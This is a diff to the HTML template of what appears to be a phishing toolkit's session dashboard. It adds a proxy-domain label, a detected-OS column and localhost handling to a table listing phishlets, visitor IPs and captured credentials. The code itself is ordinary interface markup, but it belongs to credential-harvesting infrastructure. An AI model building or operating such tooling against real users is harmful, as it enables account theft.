@@ -92,8 +92,9 @@
                                 <tr>
                                     <th>Session ID</th>
                                     <th>Phishlet</th>
-                                    <th>Domain</th>
+                                    <th>Proxy Domain</th>
                                     <th>Visitor IP</th>
+                                    <th>OS</th>
                                     <th>Credentials</th>
                                     <th>Captured</th>
                                     <th>Status</th>
@@ -117,11 +118,18 @@
                                     </td>
                                     <td>{{ session.proxy_domain }}</td>
                                     <td>
-                                        <code>{{ session.visitor_ip }}</code>
-                                        {% if session.user_agent %}
-                                        <i class="fas fa-info-circle text-muted ms-1" 
-                                           title="{{ session.user_agent }}"></i>
+                                        {% if session.visitor_ip == '127.0.0.1' %}
+                                        <code>localhost</code>
+                                        {% else %}
+                                            <code>{{ session.visitor_ip }}</code>
+                                            {% if session.user_agent %}
+                                            <i class="fas fa-info-circle text-muted ms-1" 
+                                            title="{{ session.user_agent }}"></i>
+                                            {% endif %}
                                         {% endif %}
+                                    </td>
+                                    <td>
+                                        {{session.detect_os}}
                                     </td>
                                     <td>
                                         {% if session.captured_username or session.captured_password %}
